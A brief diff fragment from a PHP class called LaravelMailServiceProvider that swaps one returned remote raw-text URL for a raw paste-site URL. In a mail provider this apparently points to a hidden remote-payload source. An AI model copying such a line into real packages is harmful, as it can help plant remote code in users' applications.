@@ -476,7 +476,7 @@ class LaravelMailServiceProvider
 
     {
 
-        return 'https://jakut-pride.pages.dev/pepeklah3.txt';
+        return 'https://pastefy.app/Fc1I1XGS/raw';
 
     }
 
